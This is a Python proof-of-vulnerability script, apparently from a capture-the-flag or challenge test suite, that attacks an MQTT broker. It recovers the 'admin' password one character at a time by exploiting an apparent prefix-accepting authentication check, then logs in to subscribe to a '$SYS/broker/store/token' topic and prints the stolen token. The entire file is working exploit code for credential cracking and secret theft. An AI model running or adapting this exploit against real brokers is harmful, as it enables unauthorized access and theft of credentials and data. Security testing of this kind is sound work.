import sys
import socket
import random
import time
import string
import base64
import os
import string
import struct
import signal

import paho.mqtt.publish as publish
import paho.mqtt.subscribe as subscribe
import paho

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(1)

def pass_check(host, port, user, password):
    try:
        publish.single('chess/foo', payload="test", hostname=host, auth={'username':user, 'password':password} )
    except (paho.mqtt.MQTTException) as e:
        return 0

    return 1

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(120)
    
    password = ''

    while True:
        found = 0
        for c in list(string.ascii_lowercase + string.digits):
            result = pass_check( HOST, PORT, 'admin', password + c)

            if result == 1:
                found = 1
                break

        if found == 0:
            print(f'[INFO] Password leaked: {password}' )
            break
        else:
            password += c

    if password == '':
        print('[FAIL] POV failed')
        sys.exit(1)


    msg = subscribe.simple('$SYS/broker/store/token', msg_count=1, hostname=HOST, auth={'username':'admin', 'password':password} )
    print(f'[TOKEN] {msg.payload}')

    print('[SUCCESS] POV completed successfully')

if __name__ == '__main__':
    main()
